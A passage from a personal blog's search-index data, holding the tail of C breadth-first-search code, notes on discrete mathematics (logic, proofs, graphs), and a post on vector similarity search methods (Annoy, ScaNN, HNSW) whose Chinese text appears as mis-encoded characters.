adj-&gt;vertex); &#125; &#125; &#125; clear_queue(queue);&#125;int main() &#123; int n, m, k; scanf(\"%d %d\", &amp;n, &amp;m); Graph *graph = (Graph *)malloc(sizeof(Graph)); init_graph(graph, n); for (int i = 0; i &lt; m; ++i) &#123; int x, y; scanf(\"%d %d\", &amp;x, &amp;y); insert(graph, x, y); &#125; scanf(\"%d\", &amp;k); bfs(graph, k); clear_graph(graph); return 0;&#125;","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"Data Structure","slug":"Notes/Data-Structure","permalink":"https://racleray.github.io/categories/Notes/Data-Structure/"}],"tags":[{"name":"data structure","slug":"data-structure","permalink":"https://racleray.github.io/tags/data-structure/"},{"name":"cs basic","slug":"cs-basic","permalink":"https://racleray.github.io/tags/cs-basic/"}],"author":"HeRui"},{"title":"ç¦»æ•£æ•°å­¦","slug":"ç¦»æ•£æ•°å­¦","date":"2021-10-03T12:54:44.000Z","updated":"2023-08-07T11:54:31.048Z","comments":true,"path":"posts/fbbb19a4.html","link":"","permalink":"https://racleray.github.io/posts/fbbb19a4.html","excerpt":"Brief summary notes about discrete math.","text":"Representation Set: no order set roster notation: \\(\\{1, 2, 3\\}\\) set builder notation: \\(\\{x|P(x)\\}\\), P means Property Empty set: \\(\\phi \\subset \\{1,2,3\\}\\) is vacuously true. ï¼ˆç©ºçœŸï¼‰ Ordered Pairs (a, b, c): order matters a, b, c : can be different type of elements Cartesian Product: ç¬›å¡å°”ç§¯ \\(A Ã— B\\) ï¼š is all ordered pairs (a, b) where a \\(\\in\\) A, b \\(\\in\\) B. \\(\\{a,b\\} Ã— \\{0,1\\}\\) = { (a, 0), (a, 1), (b, 0), (b, 1) } A point in a two-dimensional coordinate system can be represented by \\(R \\times R\\). äºŒç»´åæ ‡ç³»ä¸­çš„ç‚¹å¯è¡¨ç¤ºä¸º \\(R \\times R\\) Relations Def: â€‹ A relation R between A and B is a subset of \\(A \\times B\\). Function Def: â€‹ A function F between A and B is a relation between A and B such that: for every \\(x \\in A\\) there is a \\(y \\in B\\) such that \\((x,y) \\in F\\) if \\((x,y)\\in F \\ and \\ (x,z) \\in F\\) then \\(y=z\\) Ex: \\(x^2 + y^2 = 1\\) is not a function in Discrete Math domain definition. Statement Def: â€‹ A sentence that is either True or False. Combine Form: \\(\\lnot p\\) \\(p \\land q\\) \\(p\\lor q\\) Ex 1: â€‹ \"My shirt is gray but my shorts are not.\" â€‹ p: \"my shirt is gray\", q: \"my shorts are gray\" â€‹ ~q: \"my shorts are not gray\" â€‹ the result logic form: \\(p \\land \\lnot q\\) Truth table p q \\(\\lnot p\\) \\(p \\land q\\) \\(p\\lor q\\) T T F T T T F F F T F T T F T F F T F F Logically equivalent Def: â€‹ Two statements have the same truth table. Ex: \\(p \\equiv \\lnot(\\lnot p)\\) Tautology Def: â€‹ A tautology is a statement that is always True. Contradiction Def: â€‹ A contradiction is a statement that is always False. Basic Laws Obvious but useful DeMorgan`s Law: \\(\\lnot(p \\land q) \\equiv (\\lnot p) \\lor (\\lnot) q\\) \\(\\lnot(p \\lor q) \\equiv (\\lnot p) \\land (\\lnot) q\\) Identity Laws: \\(p \\lor contradiction \\equiv p\\) \\(p \\land tautology \\equiv p\\) Universal Bound Laws: \\(p \\land contradiction \\equiv contradiction\\) \\(p \\lor tautology \\equiv tautology\\) Ex: \\[ \\begin{align*} (\\lnot(p \\lor \\lnot q)) \\land tautology(t) &amp; \\\\ (DeMorgan`s\\ Law) &amp; \\equiv (\\lnot p \\land \\lnot(\\lnot q)) \\land t \\\\ (Double\\ Negative) &amp; \\equiv (\\lnot p \\land q) \\land t \\\\ (Identity) &amp; \\equiv \\lnot p \\land q \\end{align*} \\] Conditional statements Def: â€‹ \\(p \\to q\\) means \"if p is True then q is True\" p q \\(p \\to q\\) \\(\\lnot p \\lor q\\) T T T T T F F F F T T(vacuously true) T F F T(vacuously true) T If p is false, then I didn`t have a assumption indeed. Think it as a vacuously true statement. Vacuously true statement When the hypothesis (\\(p\\)) is false. Ex: if I am a pig, then the world will be better. â€‹ equal form: Either I am not a pig, or the world will be better. â€‹ \"I am not a pig.\". It is vacuously true, anyway. So the whole statement is True. Negating a conditional \\(\\lnot (p \\to q) \\equiv \\lnot (\\lnot p \\lor q)\\) \\[ \\begin{align*} \\lnot (\\lnot p \\lor q) &amp; \\equiv (\\lnot \\lnot p \\land \\lnot q) \\\\ &amp; \\equiv p \\land \\lnot q \\end{align*} \\] Contrapositive of a statement Def: â€‹ \\(p \\to q \\equiv \\lnot q \\to \\lnot p\\) equal form: \\(\\lnot p \\lor q \\equiv q \\lor \\lnot p\\) Converse of a statement Def: â€‹ Converse of \\(p \\to q\\) is \\(q \\to p\\). Not necessarily logically equivalent. Inverse of a statement Def: â€‹ Inverse of \\(p \\to q\\) is \\(\\lnot p \\to \\lnot q\\). Cause the contrapositive is \\(\\lnot q \\to \\lnot p\\) which is the converse of \\(\\lnot p \\to \\lnot q\\), so: the inverse of \\(p \\to q\\) is the converse of the contrapositive of \\(p \\to q\\). Biconditional Def: â€‹ \\(p \\leftrightarrow q\\) means \\(p \\to q\\) and \\(q \\to p\\). Ex: I will pass the exam if and only if I study hard. â€‹ It means biconditional. Logic Arguments Def: â€‹ A valid argument is a list of premises from which the conclusion follows. premises: statements. Modus Ponens: è‚¯å®šå‰ä»¶æ¨ç† if \\(p\\), then \\(q\\) \\(p\\) therefore \\(q\\) p q \\(p \\to q\\)(premises) p(premises) conclusion T T T T T T F F \\(\\boxtimes\\) \\(\\boxtimes\\) F T T \\(\\boxtimes\\) \\(\\boxtimes\\) F F T \\(\\boxtimes\\) \\(\\boxtimes\\) We focus on where premises is true. Modus Tollens: å¦å®šåä»¶æ¨ç† if \\(p\\), then \\(q\\) \\(\\lnot q\\) therefore \\(\\lnot p\\) We focus on where premises is true. Generalization \\(p\\) (True) therefore, \\(p \\lor q\\) Specialization \\(p \\land q\\) (True) therefore, \\(p\\) Contradiction \\(\\lnot p \\to contradiction\\) therefore, \\(p\\) Predicate Def: â€‹ A predicate(è°“è¯) is a statement depending on variables which becomes a statement upon substituting values in the domain. Ex: â€‹ P(x): x is the variable that is a factor of 12 with domain \\(Z^+\\). P(x) is a predicate. When x = 6, P(6) is True. When x = 7, P(7) is False. True set Def: â€‹ It is a predicate P(x) satisfies that \\(\\{x \\in D | P(x)\\ is\\ True\\}\\) Universal Quantifier \\(\\forall\\) means \"for all\". \\(\\forall x \\in D, P(x)\\) means: For all x in domain D, \\(P(x)\\) is True. Ex: â€‹ Every dog is mammal. D is the dog domain, P(x) means x is a mammal. Existential Quantifier \\(\\exists\\) mean \"there exists\" \\(\\exists x \\in D, P(x)\\) means: There exists x in the domain, such that P(x) is True. Ex: â€‹ Some person is the oldest in the world. D is people in the world. P(x) means that x is the oldest. Summary P: \"The earth is round.\" -&gt; Statement P(x): \"x is round.\" -&gt; Predicate Q: \\(\\forall x \\in D, P(x)\\): \"Every dog is a mammal.\" -&gt; Statement Q: \\(\\exists x \\in D, P(x)\\): \"Some person is the oldest in the world.\" -&gt; Statement Negate Quantifier For example, we have \"\\(\\forall x \\in Z^+, x &gt; 4\\)\". Negate the quantifier: \\[ \\lnot(\\forall x \\in D, P(x)) \\equiv (\\exists x \\in D, \\lnot P(x)) \\] So, for the example, we have \"\\(\\exists x \\in Z^+, x \\leqslant 4\\)\". Ex: â€‹ Every integer has a larger integer. It is \\(\\forall x \\in Z, P(x): (\\exists y \\in Z, P(y): (y &gt; x))\\). Negate it, we have \\(\\exists x \\in Z, (\\forall y \\in Z, y \\leqslant x)\\), which can`t be True. Ex: â€‹ Some number in D is the largest. It is \\(\\exists x \\in D, (\\forall y \\in D, x \\geqslant y)\\). Negate it, we have \\(\\forall x \\in D, (\\exists y \\in D, x &lt; y)\\) Conditional Predicate Universal-Conditionals Def: â€‹ \\(P(x) \\Rightarrow Q(x)\\) means \\(\\forall x \\in D, P(x) \\to Q(x)\\ is\\ True\\). Ex: â€‹ If x is a dog, then x is a mammal. D maybe all possible animals. Sufficient Condition Def: â€‹ If \\(A(x)\\) , then \\(B(x)\\). We have \\(A(x)\\) is a sufficient condition for \\(B(x)\\). Necessary Condition Def: â€‹ If $ A(x)$ , then $ B(x)$. We have \\(A(x)\\) is a necessary condition for \\(B(x)\\). Use contrapositive statement to explain above definition. Proof Precisely define even &amp; odd integers n is even integer if \\(\\exists k \\in Z\\), such that \\(n=2k\\). n is odd integer if \\(\\exists k \\in Z\\), such that \\(n=2k+1\\). Theorem 1 to proof An even integer plus an odd integer is another odd integer. Proof Assumption: â€‹ Suppose m is even and n is odd. Definitions: â€‹ \\(\\exists k_1 \\in Z \\ and \\ \\exists k_2 \\in Z\\) , so that \\(m = 2*k_1\\) and \\(n=2*k_2+1\\). Manipulate: Then, \\[ \\begin{align*} m+n &amp; = 2k_1+2k_2+1 \\\\ &amp; = 2(k_1+k_2) + 1 \\end{align*} \\] Definitions: Thus, â€‹ \\(\\exists k_3 \\in Z\\) so that \\(m+n=2k_3+1\\). Conclusion: â€‹ Thus \\(m+n\\) is odd. Theorem 2 to proof An even integer times an even integer is another even integer. Proof: Formally stated theorem: â€‹ \\(\\forall m,n \\in Z\\) if m, n are even, then \\(mn\\) is even. Assumption: â€‹ Suppose m, n are even. Definition: â€‹ \\(\\exists k_1, k_2 \\in Z\\) so that \\(m = 2k_1, n=2k_2\\). Manipulation: \\[ \\begin{align*} mn &amp; = 2k_1 *2k_2 \\\\ &amp; = 2(2*k_1*k_2) \\end{align*} \\] Definition: â€‹ Let t = \\(2k_1k_2\\), \\(t \\in Z\\). Conclusion: â€‹ Thus, \\(mn\\) is even. Proof by counterexample Aim is prove \\(P(x) \\Rightarrow Q(x)\\) is false. To do that find one \\(a \\in D\\) where \\(P(a) \\land \\lnot Q(a)\\) is true. Proof by division into class Divide the theorem into different cases. Proof by contradiction Suppose \\(\\lnot p\\) is true; Find a contradiction like 0 = 1; Therefore, \\(p\\) is true. \\(\\lnot p \\to contradiction\\) therefore, \\(p\\) Proof by contrapositive \\(p \\to q \\equiv \\lnot q \\to \\lnot p\\) Goal: prove \\(P(x) \\Rightarrow Q(x)\\). Instead, prove: \\(\\lnot Q(x) \\Rightarrow \\lnot P(x)\\). Sequence Def: â€‹ A sequence is a function \\(f: Z^+ \\to C\\). Ex: â€‹ \\(f(k) = (-1)^k(3*k)\\) Induction Goal: prove \\(P(n), \\forall n \\geqslant 1\\). Step 1: prove \\(P(a), P(b), ...,P(x)\\) is true. Step 2: Assume \\(P(k)\\) is true, Prove \\(P(k+1)\\) is true, \\(x &lt; k\\). Skipped things Relations of Sets. Permutation and combination. Bayes` theorem. Markov Chain. Graph Def: â€‹ A graph (V, E) has a set V called \"vertices\" and a set E called \"edges\" that consisting of two-element subsets of V. Ex: â€‹ \\(V = \\{A,B,C,D\\}\\) â€‹ \\(E = \\{\\{A,B\\}, \\{B,A\\}, \\{B,D\\}, \\{D,B\\}, \\{B,C\\}, \\{C,D\\}, \\{A,C\\}\\}\\) Complete Graph Def: â€‹ A simple undirected graph in which every pair of distinct vertices is connected by a unique edge. The notation is \\(K_n\\). The edge number is \\(\\frac {n(n-1)}{2}\\). Connected Graph Def: â€‹ A graph is connected if you can get from any vertex to any other via edges. Induced Subgraph Def: â€‹ \\((V_1, E_1)\\) is an induced subgraph of \\((V_2,E_2)\\) if it is a graph where \\(V_1 \\subseteq V_2\\) and \\(E_1\\) contains all possible edges consisting of vertices in \\(V_1\\) and \\(E_1 \\subset E_2\\). Degree Def: â€‹ The degree of a vertex is the number of edges attached. Fact: â€‹ Sum of degrees of all vertices is even. Cause every edge adds 2 degrees. Ex: â€‹ Among 5 people, could everyone be friends with exactly 2 people? The degree is \\(5 * 2=10\\), it`s possible. â€‹ Among 5 people, could everyone be friends with exactly 3 people? The degree is \\(5 * 3=15\\), it`s not possible. Euler Path Def: â€‹ An Euler Path walks through a graph using every edge exactly once. â€‹ An Euler Circuit starts and stops at the same vertex when walking through a Euler Path. Theorem: â€‹ If a graph has an Euler Circuit, then every vertex has even degree. Contrapositive Theorem: â€‹ If a graph has a vertex with odd degree, no Euler Circuit is possible.","categories":[{"name":"Math","slug":"Math","permalink":"https://racleray.github.io/categories/Math/"},{"name":"basic","slug":"Math/basic","permalink":"https://racleray.github.io/categories/Math/basic/"}],"tags":[{"name":"cs basic","slug":"cs-basic","permalink":"https://racleray.github.io/tags/cs-basic/"},{"name":"math","slug":"math","permalink":"https://racleray.github.io/tags/math/"}],"author":"HeRui"},{"title":"Embedding & Searching","slug":"Embedding-Searching","date":"2021-09-05T06:59:46.000Z","updated":"2023-08-07T11:54:31.028Z","comments":true,"path":"posts/9e991c30.html","link":"","permalink":"https://racleray.github.io/posts/9e991c30.html","excerpt":"","text":"ç›¸ä¼¼æ€§æœç´¢å¸¸è§äºä»¥å›¾æœå›¾ï¼Œå¬æ­Œè¯†æ›²...è¿™ç±»æŠ½è±¡æŸ¥æ‰¾é—®é¢˜ä¸­ã€‚ä½ æ²¡æœ‰æ˜ç¡®çš„Keyï¼Œä¸èƒ½ä½¿ç”¨SQLä¹‹ç±»çš„æ–¹æ³•æŸ¥æ‰¾æ•°æ®åº“ã€‚ä½†æ˜¯å¯ä»¥é€šè¿‡æŠ½è±¡çš„ embedding å‘é‡æ¥è¿›è¡Œæ£€ç´¢ã€‚ ä¸€èˆ¬æ ·æœ¬å‘é‡è¡¨ç¤ºå¯ä»¥é€šè¿‡ Skip-gram with negative sampling æ–¹æ³•ã€DSSM è¿™ç±»æ–¹æ³•ã€BERT è¿™ç±»æ–¹æ³•ç­‰ç­‰ã€‚å¾—åˆ°å‘é‡è¡¨è¾¾ä¹‹åï¼Œä¸€èˆ¬è¿˜éœ€è¦é«˜æ•ˆçš„å¬å›ç´¢å¼•æ–¹æ³•ï¼Œå› ä¸ºæš´åŠ›åŒ¹é…åœ¨è¾ƒå¤§æ•°æ®é‡åœºæ™¯ä¸‹ï¼Œé€Ÿåº¦é€šå¸¸å·®å¼ºäººæ„ã€‚ è¿™ç±»é€šè¿‡æŠ½è±¡ embedding çš„å…·æœ‰è¯­ä¹‰æ£€ç´¢èƒ½åŠ›çš„æ–¹æ³•ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š ä¸€ç»„ç›¸å…³ç®—æ³•çš„ benchmarks å¯¹æ¯”å›¾å¦‚ä¸‹ï¼š Annoy SpotifyéŸ³ä¹å…¬å¸å¼€æºçš„å·¥å…·åº“ã€‚ è¿™æ˜¯ä¸€ç§åŸºäºæ ‘çš„æ–¹æ³•ã€‚ ç®—æ³•ç®€å•æè¿°ï¼š å®šä¹‰ï¼š N -- æ ‘æ¨¡å‹çš„æ€»ä¸ªæ•°ï¼› â€‹ K -- å¶èŠ‚ç‚¹æœ€å¤§æ ·æœ¬æ•°ï¼› â€‹ M -- ç›®æ ‡Top Mæ ·æœ¬æ•°ï¼› â€‹ D -- è”é€šä¸¤ä¸ªå­ç©ºé—´æ‰€è¦æ±‚çš„æœ€å¤§è·ç¦»ï¼› è¿‡ç¨‹ï¼š ==å»ºæ ‘== 1234for i in (1, ... , `N`): 1. éšæœºé€‰å–ä¸¤ä¸ªæ ·æœ¬ç‚¹ï¼Œè®¡ç®—ä¸¤è€…ä¸­ç‚¹å¤„è¶…å¹³é¢ï¼Œåˆ’åˆ†ä¸¤ä¾§æ ·æœ¬ä¸ºä¸¤ä¸ªå­æ ‘ï¼› 2. ç»§ç»­åˆ’åˆ†æ ·æœ¬ç‚¹ï¼Œç›´åˆ°å¶å­èŠ‚ç‚¹ä¸­æ ·æœ¬æ•°ä¸å¤§äº `K`ï¼› 3. ä¿å­˜äºŒå‰æ ‘ï¼ˆå³ä¿å­˜æ¯ä¸ªåˆ’åˆ†ç‚¹çš„å€¼ï¼‰ï¼› ==æœç´¢== 1234567for j in (1, ... , `N`): 1. ä»æ ¹èŠ‚ç‚¹å¼€å§‹ï¼Œæ ¹æ®äºŒåˆ†èŠ‚ç‚¹ï¼Œå‘ä¸‹éå†ï¼› 2. if ä¸¤ä¸ªå­ç©ºé—´ç›¸è¿‘ï¼ˆéšæœºé€‰çš„ä¸¤ä¸ªç‚¹è·ç¦»å°äº `D`ï¼‰ï¼ŒåŒæ—¶å‘ä¸¤ä¸ªå­èŠ‚ç‚¹ï¼Œå‘ä¸‹éå†ï¼› 3. ä¿å­˜æ‰¾åˆ°çš„å¶å­èŠ‚ç‚¹ç©ºé—´ï¼ˆèŠ‚ç‚¹é›†åˆï¼‰ï¼›èšåˆ`N`ä¸ªå¶å­èŠ‚ç‚¹é›†åˆï¼Œä»¥æ‰¾åˆ°è·ç¦»ç›®æ ‡èŠ‚ç‚¹æœ€è¿‘çš„ Top `M `ä¸ªæ ·æœ¬ç‚¹ï¼›è¿”å›ç»“æœ Annoyåˆ©ç”¨äºŒå‰æ ‘çš„ç»“æ„å¯¹ç©ºé—´è¿›è¡Œéšæœºåˆ’åˆ†ï¼Œå»ºç´¢å¼•é˜¶æ®µæ•ˆç‡æœ‰æ‰€æå‡ã€‚äºŒå‰æ ‘ç»“æ„åœ¨æ£€ç´¢æ—¶æ•ˆç‡ä¹Ÿå¾ˆé«˜ã€‚ ç‰¹ç‚¹ï¼š å¬å›ç‡è¾ƒä¼˜ï¼Œå’Œæš´åŠ›æœç´¢æ³•ç›¸æ¯”è¾ƒåŸºæœ¬ä¸€è‡´ æŸ¥è¯¢é€Ÿåº¦å¾ˆå¿« åƒä¸‡é‡çº§çš„itemï¼Œæ—¶é—´ä¸ºè‹¥å¹²å°æ—¶ï¼Œå°šå¯ä»¥å¿å— åƒä¸‡é‡çº§çš„itemï¼Œä»¥100æ£µæ ‘ä¸ºä¾‹ï¼Œç´¢å¼•æ–‡ä»¶å¤§çº¦å‡ ä¸ªGï¼Œæœ‰ç‚¹å¤§äº† å¤šæ ¸åˆ©ç”¨æ”¯æŒçš„ä¸æ˜¯å¾ˆå¥½ ScaNN ScaNNæ˜¯googleæå‡ºçš„é«˜æ•ˆå‘é‡æ£€ç´¢ç®—æ³•ï¼Œæ–‡ä¸­è¯´è¿™ä¸ªæ–¹æ³•æ¯”ç›®å‰å·²æœ‰çš„å…¶ä»–æ–¹æ³•æœ‰æ›´é«˜çš„ç²¾åº¦ï¼Œæ£€ç´¢é€Ÿåº¦ä¹Ÿè¦å¿«ä¸¤å€ã€‚å·¥å…·åº“å¼€æºåœ°å€ GitHubã€‚ è¿™ç§ç®—æ³•ä¸»è¦æ˜¯ä¼˜åŒ– Inner product è·ç¦»åº¦é‡ä¸‹çš„æœç´¢ã€‚è¿™ç±»é—®é¢˜è¢«å«åš maximum inner-product search (MIPS)ã€‚åœ¨å¤§æ•°æ®é‡åœºæ™¯ä¸‹ï¼ŒMIPSçš„è®¡ç®—å¤æ‚åº¦æ˜¯æ¯”è¾ƒé«˜çš„ï¼Œç©·ä¸¾æœç´¢å‡ ä¹ä¸å¯èƒ½åœ¨æœŸæœ›çš„æ—¶é—´èŒƒå›´å†…å®Œæˆã€‚ è®ºæ–‡ä¸­ï¼Œé˜è¿°äº†ç›®å‰ä½¿ç”¨çš„å‘é‡å‹ç¼©ï¼ˆæ¯”å¦‚èšç±»æˆ–è€…é™ç»´ï¼‰æ‰€ä½¿ç”¨æ–¹æ³•ï¼Œä¼šä½¿å¾—å‹ç¼©åçš„å‘é‡é—´å¹³å‡è·ç¦»å˜å°ã€‚è¿™å¯èƒ½å¯¼è‡´äº†å‘é‡å·®å¼‚æ€§çš„æŸå¤±ï¼Œæ¯”å¦‚ä¸queryå‘é‡çš„å†…ç§¯çš„ç›¸å¯¹å¤§å°å…³ç³»ä¼šå‡ºç°é”™è¯¯ã€‚æ¯”å¦‚è¿™æ ·ï¼š ä¸Šå›¾ä¸­ï¼Œx è¢«åˆ†åˆ«å‹ç¼©åˆ° c ç‚¹ï¼Œå…¶ä½™ q çš„å†…ç§¯å¤§å°å…³ç³»å‘ç”Ÿé¢ å€’ã€‚æœ¬æ¥ \\(&lt;q,x_2&gt; greater\\ than &lt;q,x_1&gt;\\)ï¼Œ å‹ç¼©å \\(&lt;q,x_1&gt; greater\\ than &lt;q,x_2&gt;\\)ã€‚ è®ºæ–‡ä¸­æŒ‡å‡ºï¼Œè¿™ç§æ–¹æ³•å‹ç¼©ï¼Œåªè€ƒè™‘äº†è·ç¦»çš„é•¿åº¦å¤§å°ï¼Œè€Œæ²¡æœ‰è€ƒè™‘è·ç¦»çš„è§’åº¦æ–¹å‘ã€‚ ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼Œè®¡ç®—ä¸¤ä¸ªå‘é‡çš„å†…ç§¯ï¼Œå½“ä¸€ä¸ªå‘é‡åœ¨å¹³è¡ŒäºæŠ•å½±æ–¹å‘ï¼ˆä¸¤ä¸ªå‘é‡æ–¹å‘éƒ½å¯ä½œä¸ºæŠ•å½±æ–¹å‘ï¼‰å˜åŒ– k ï¼Œå†…ç§¯çš„å˜åŒ–ä¸º \\(d_1\\)ã€‚è€Œå¦‚æœå®åœ¨ä¸€ä¸ªå‘é‡çš„å‚ç›´æ–¹å‘ï¼Œå˜åŒ– k ï¼Œå†…ç§¯çš„å˜åŒ–ä¸º \\(d_2\\)ã€‚é‚£ä¹ˆï¼Œ\\(d_2 â‰¥ d_1\\)ä¸€å®šæˆç«‹ã€‚ç”»ä¸ªå›¾å°±èƒ½éªŒè¯ã€‚ æ‰€ä»¥ï¼Œç°åœ¨åœ¨å‹ç¼©æ—¶ï¼Œå¯¹äº x ä¸ c åœ¨å¹³è¡Œäº x å‘é‡æ–¹å‘ä¸Šçš„å˜åŒ–ï¼Œç»™äºˆä¸€ä¸ªå¤§çš„æƒ©ç½šé¡¹ï¼›è€Œå¯¹äº x ä¸ c åœ¨å‚ç›´äº x å‘é‡æ–¹å‘ä¸Šçš„å˜åŒ–ï¼Œç»™äºˆä¸€ä¸ªè¾ƒå°çš„æƒ©ç½šé¡¹ã€‚ä»¥æ­¤æ¥è¿›è¡Œå‹ç¼©ã€‚å–äº†åå­—å«ï¼ŒAnisotropic Vector Quantizationã€‚ æ•ˆæœå¦‚ä¸‹ï¼š å†…ç§¯ç›¸å¯¹å¤§å°å…³ç³»ï¼Œæ²¡æœ‰å˜åŒ–ã€‚æŒ‰ç…§è®ºæ–‡ä¸­çš„è¯´æ³•ï¼Œè¿™æ ·åšæœ€å¤§åŒ–äº†å‹ç¼©åå„ä¸ªç‚¹ä¹‹é—´çš„å¹³å‡è·ç¦»ï¼Œæœ‰åˆ©äºå·®å¼‚åŒ–ç›¸ä¼¼åº¦çš„å€¼ã€‚ ç®—æ³•å¤§è‡´æµç¨‹ï¼š æ ¹æ®æ ·æœ¬æ•°é‡å¤§å°ï¼Œé€‰æ‹©æ˜¯å¦å°†æ•°æ®è¿›è¡Œ Partitioningã€‚è‹¥ Partitioningï¼Œåœ¨æ£€ç´¢æ—¶ï¼Œä¼šå…ˆé€‰å‡º Top m ä¸ªPartitioningï¼Œå†è¿›è¡Œç»†åŒ–æ£€ç´¢ã€‚ Scoringï¼šä½¿ç”¨å¿«é€Ÿçš„ç²—ç²’åº¦çš„è·ç¦»åº¦é‡ï¼Œè®¡ç®—queryç›¸å¯¹æ‰€æœ‰æ ·æœ¬ï¼ˆæˆ–Partitionçš„æ ·æœ¬ï¼‰çš„è·ç¦»ã€‚é€‰å‡º Top k ä¸ªã€‚ Rescoring: å¯¹ Top k ä¸ªScoringç»“æœï¼Œè¿›è¡Œæ›´ç²¾ç¡®çš„è·ç¦»åº¦é‡ï¼Œé‡æ‹åè¾“å‡º Top k çš„ç»“æœã€‚ ä½¿ç”¨ doc æ¯”è¾ƒç®€çŸ­ï¼Œå¯ä»¥å‚è€ƒã€‚ HNSW HNSWæ˜¯ä¸€ç§å›¾ç®—æ³•ã€‚å…¶æ ¹æ®æœç´¢åœºæ™¯çš„ç‰¹ç‚¹ï¼Œè®¾è®¡å‡ºäº†è¿™ç§ç®—æ³•ã€‚ é¦–å…ˆï¼Œç®€å•æƒ³æƒ³å›¾çš„æœç´¢ï¼Œéº»çƒ¦çš„é—®é¢˜å¯èƒ½æœ‰å“ªäº›ã€‚å¯èƒ½æœ‰å­¤ç«‹çš„èŠ‚ç‚¹ï¼Œæˆ–è€…å¯èƒ½ç›¸é‚»èŠ‚ç‚¹å¤ªå¤šã€‚åœ¨è¿‘é‚»æœç´¢åœºæ™¯ä¸‹ï¼Œå¯èƒ½æœ‰å‡ ä¸ªè·ç¦»ç›®æ ‡å¾ˆè¿‘çš„èŠ‚ç‚¹ï¼Œä½†æ˜¯æ²¡æœ‰ç›¸äº’è¿é€šï¼Œé‚£ä¹ˆå°±éœ€è¦éå†æ›´å¤šçš„è·¯å¾„ï¼Œä»è€Œéå†å®Œå…¨è¿™å‡ ä¸ªèŠ‚ç‚¹ã€‚ å¦å¤–ï¼ŒèŠ‚ç‚¹ä¼—å¤šæ—¶ï¼Œå½“ä¸¤ä¸ªèŠ‚ç‚¹è·ç¦»ç›¸å¯¹è¾ƒè¿œæ—¶ï¼Œéå†æ•°é‡ä¼šæŒ‡æ•°çº§å¢åŠ ã€‚ HNSWçš„è§£å†³æ–¹æ³•å¦‚ä¸‹ï¼š å®šä¹‰ï¼š â€‹ N -- æ€»æ ·æœ¬æ•°ï¼› â€‹ K -- æ¯ä¸ªèŠ‚ç‚¹æœ€å¤šæœ‰Kä¸ªç›¸è¿çš„è¿‘é‚»èŠ‚ç‚¹ï¼› â€‹ P1 -- ä»¥ P1 çš„æ¦‚ç‡å°†èŠ‚ç‚¹è®¾ç½®ä¸ºäºŒçº§ç´¢å¼•ï¼› â€‹ P2 -- ä»¥ P2 çš„æ¦‚ç‡å°†èŠ‚ç‚¹è®¾ç½®ä¸ºä¸€çº§ç´¢å¼•ï¼ˆP1 &gt; P2ï¼Œä¸¤è€…æŒ‡æ•°é€’å‡ï¼‰ï¼› â€‹ M -- ç›®æ ‡Top Mæ ·æœ¬æ•°ï¼› è¿‡ç¨‹ï¼š ==å»ºå›¾== 1234567891011121314151617181920for i in (1, ... , N): if (éšæœºæ¦‚ç‡å€¼ p) &gt; P1: äºŒçº§ç´¢å¼•å›¾æ’å…¥èŠ‚ç‚¹ï¼š 1. å°†è¢«æ’å…¥èŠ‚ç‚¹è¿æ¥æŒ‡å‘æœ€è¿‘é‚»çš„ K ä¸ªèŠ‚ç‚¹ï¼ˆå°äºç­‰äº Kï¼‰ï¼› 2. æ›´æ–°è¢«è¿æ¥çš„ K ä¸ªèŠ‚ç‚¹ï¼ˆå°äºç­‰äº Kï¼‰çš„æœ€è¿‘é‚»çš„ K ä¸ªèŠ‚ç‚¹ï¼› 3. ä¿è¯æ¯ä¸ªèŠ‚ç‚¹éƒ½æœ‰è¿æ¥ï¼Œä¸”æœ€å¤§è¿æ¥ä¸è¶…è¿‡ Kï¼› if (éšæœºæ¦‚ç‡å€¼ p) &gt; P2: ä¸€çº§ç´¢å¼•å›¾æ’å…¥èŠ‚ç‚¹ï¼š 1. å°†è¢«æ’å…¥èŠ‚ç‚¹è¿æ¥æŒ‡å‘æœ€è¿‘é‚»çš„ K ä¸ªèŠ‚ç‚¹ï¼ˆå°äºç­‰äº Kï¼‰ï¼› 2. æ›´æ–°è¢«è¿æ¥çš„ K ä¸ªèŠ‚ç‚¹ï¼ˆå°äºç­‰äº Kï¼‰çš„æœ€è¿‘é‚»çš„ K ä¸ªèŠ‚ç‚¹ï¼› 3. ä¿è¯æ¯ä¸ªèŠ‚ç‚¹éƒ½æœ‰è¿æ¥ï¼Œä¸”æœ€å¤§è¿æ¥ä¸è¶…è¿‡ Kï¼› å…¨é‡æ ·æœ¬ç´¢å¼•å›¾æ’å…¥èŠ‚ç‚¹ï¼š 1. å°†è¢«æ’å…¥èŠ‚ç‚¹è¿æ¥æŒ‡å‘æœ€è¿‘é‚»çš„ K ä¸ªèŠ‚ç‚¹ï¼ˆå°äºç­‰äº Kï¼‰ï¼› 2. æ›´æ–°è¢«è¿æ¥çš„ K ä¸ªèŠ‚ç‚¹ï¼ˆå°äºç­‰äº Kï¼‰çš„æœ€è¿‘é‚»çš„ K ä¸ªèŠ‚ç‚¹ï¼› 3. ä¿è¯æ¯ä¸ªèŠ‚ç‚¹éƒ½æœ‰è¿æ¥ï¼Œä¸”æœ€å¤§è¿æ¥ä¸è¶…è¿‡ Kï¼› è¿”å›å»ºç«‹çš„å¤šçº§ç´¢å¼•å›¾ ==æœç´¢== 1231. åœ¨äºŒçº§ç´¢å¼•å›¾ä¸­æ‰¾åˆ°æœ€è¿‘é‚»èŠ‚ç‚¹ A2. åœ¨ä¸€çº§ç´¢å¼•å›¾ä¸­ä» A å¼€å§‹æ‰¾åˆ°æœ€è¿‘é‚»èŠ‚ç‚¹ B3. åœ¨å…¨é‡æ ·æœ¬ç´¢å¼•å›¾ä¸­ä» B å¼€å§‹æ‰¾åˆ° Top M çš„ç›®æ ‡èŠ‚ç‚¹ HNSWè®¾è®¡çš„æ’å…¥æœºåˆ¶ï¼Œä¿è¯äº†å›¾å…·æœ‰è‰¯å¥½çš„è¿é€šæ€§å’Œå±€éƒ¨æœç´¢ä¾¿æ·æ€§ã€‚ç±»ä¼¼è·³è¡¨ç»“æ„çš„å¤šçº§ç´¢å¼•æœºåˆ¶ï¼Œæé«˜äº†æœç´¢æ•ˆç‡ï¼Œé™ä½äº†æ•´ä½“æœç´¢å¤æ‚åº¦ã€‚ ç®—æ³•ç»†èŠ‚çœ‹æ–‡ç« ï¼Œè¿™é‡Œåªæ˜¯è‰è‰å†™å†™æ€æƒ³ã€‚å¼€æºå·¥å…·åº“C++ç‰ˆï¼šhnswlib ç‰¹ç‚¹ï¼š 